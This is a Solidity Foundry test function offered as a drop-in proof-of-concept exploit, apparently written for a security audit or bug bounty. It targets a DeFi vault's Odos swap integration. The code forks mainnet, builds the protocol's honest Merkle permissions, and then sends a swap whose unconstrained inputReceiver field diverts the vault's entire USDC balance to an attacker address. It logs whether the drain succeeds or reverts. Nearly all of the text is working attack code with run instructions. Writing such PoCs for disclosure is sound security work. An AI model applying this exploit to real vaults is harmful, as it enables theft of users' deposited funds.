// ─────────────────────────────────────────────────────────────────────────────
// DROP-IN PoC — add this ONE function inside the existing `OdosIntegrationTest`
// contract in test/integrations/OdosIntegration.t.sol (it reuses that contract's
// setUp helper, state vars, and MerkleTreeHelper). Then run:
//
//   export MAINNET_RPC_URL=<your archive RPC>   # Alchemy/Infura free tier works
//   forge test --match-test test_PoC_inputReceiverDrain -vvv
//
// It forks mainnet at the harness's pinned block, builds the protocol's OWN
// honest leaf set (so inputReceiver is NOT in any leaf — exactly like production),
// then submits a swap whose only changes are inputReceiver=attacker,
// inputAmount=0 (sweep whole balance), outputMin=1. try/catch prints the TRUTH:
// either the vault is drained, or it reverts (executor starved -> amountOut<outputMin).
// ─────────────────────────────────────────────────────────────────────────────
function test_PoC_inputReceiverDrain() external {
    _setUpSpecificBlock__USDCSwap();

    ERC20 usdc = ERC20(getAddress(sourceChain, "USDC"));
    address attacker = makeAddr("attacker");

    // Fund the vault (stand-in for real deposited principal).
    deal(address(usdc), address(boringVault), 1_000_000e6);

    // 1) Build the protocol's OWN honest leaf set (inputReceiver is not a bound arg).
    address[] memory tokens = new address[](3);
    SwapKind[] memory kind = new SwapKind[](3);
    tokens[0] = getAddress(sourceChain, "USDC"); kind[0] = SwapKind.BuyAndSell;
    tokens[1] = getAddress(sourceChain, "WETH"); kind[1] = SwapKind.BuyAndSell;
    tokens[2] = getAddress(sourceChain, "USDT"); kind[2] = SwapKind.BuyAndSell;

    ManageLeaf[] memory leafs = new ManageLeaf[](16);
    _addOdosSwapLeafs(leafs, tokens, kind);
    bytes32[][] memory manageTree = _generateMerkleTree(leafs);
    manager.setManageRoot(address(this), manageTree[manageTree.length - 1][0]);

    // Use the honest leaves: [0] approve USDC->router, [1] swap() USDC->WETH.
    ManageLeaf[] memory manageLeafs = new ManageLeaf[](2);
    manageLeafs[0] = leafs[0];
    manageLeafs[1] = leafs[1];
    bytes32[][] memory manageProofs = _getProofsUsingTree(manageLeafs, manageTree);

    address[] memory targets = new address[](2);
    targets[0] = getAddress(sourceChain, "USDC");
    targets[1] = getAddress(sourceChain, "odosRouterV2");

    bytes[] memory targetData = new bytes[](2);
    targetData[0] = abi.encodeWithSignature(
        "approve(address,uint256)", getAddress(sourceChain, "odosRouterV2"), type(uint256).max
    );

    // 2) THE ONLY MALICIOUS CHANGES vs the honest swap:
    //    inputReceiver = attacker, inputAmount = 0 (sweep whole balance), outputMin = 1.
    DecoderCustomTypes.swapTokenInfo memory s = DecoderCustomTypes.swapTokenInfo({
        inputToken: getAddress(sourceChain, "USDC"),
        inputAmount: 0,                       // 0 => OdosRouterV2 sweeps the vault's whole USDC balance
        inputReceiver: attacker,              // UNCONSTRAINED by the decoder -> diverted to attacker
        outputToken: getAddress(sourceChain, "WETH"),
        outputQuote: 1,
        outputMin: 1,                         // strategist-chosen; only needs to be > 0
        outputReceiver: address(boringVault)
    });

    // Honest USDC->WETH path lifted from the protocol's own Odos test (Odos API output).
    bytes memory pathDefinition =
        hex"010203000d0101010201ff00000000000000000000000000000000000000000088e6a0c2ddd26feeb64f039a2c41296fcb3f5640a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000";

    targetData[1] = abi.encodeWithSignature(
        "swap((address,uint256,address,address,uint256,uint256,address),bytes,address,uint32)",
        s, pathDefinition, getAddress(sourceChain, "odosExecutor"), uint32(0)
    );

    address[] memory decodersAndSanitizers = new address[](2);
    decodersAndSanitizers[0] = rawDataDecoderAndSanitizer;
    decodersAndSanitizers[1] = rawDataDecoderAndSanitizer;
    uint256[] memory values = new uint256[](2);

    // 3) BEFORE / AFTER.
    uint256 vaultBefore = usdc.balanceOf(address(boringVault));
    emit log_named_uint("vault USDC before   ", vaultBefore);
    emit log_named_uint("attacker USDC before", usdc.balanceOf(attacker));

    try manager.manageVaultWithMerkleVerification(manageProofs, decodersAndSanitizers, targets, targetData, values) {
        uint256 vaultAfter = usdc.balanceOf(address(boringVault));
        uint256 attackerAfter = usdc.balanceOf(attacker);
        emit log_named_uint("vault USDC after    ", vaultAfter);
        emit log_named_uint("attacker USDC after ", attackerAfter);
        if (vaultBefore > 0 && attackerAfter >= vaultBefore) {
            emit log(">>> RESULT: DRAIN SUCCEEDED - the merkle proof authorized the call AND the router moved the vault's USDC to the attacker. This is the Critical.");
        } else {
            emit log(">>> RESULT: call succeeded but vault NOT drained - inspect balances / router accounting.");
        }
    } catch Error(string memory reason) {
        emit log_named_string(">>> RESULT: REVERTED - attack does NOT execute end-to-end. reason", reason);
        emit log("    If reason is a slippage/router error: the merkle layer DID authorize the diverted-inputReceiver call (decoder blindness confirmed), but the starved executor produced < outputMin, so the tx reverts. The inputReceiver removal is then effectively safe UNLESS a pathDefinition can supply >= outputMin output independently of the diverted input.");
    } catch (bytes memory lowLevel) {
        emit log_named_bytes(">>> RESULT: REVERTED (low-level) - attack does NOT execute end-to-end. data", lowLevel);
    }
}
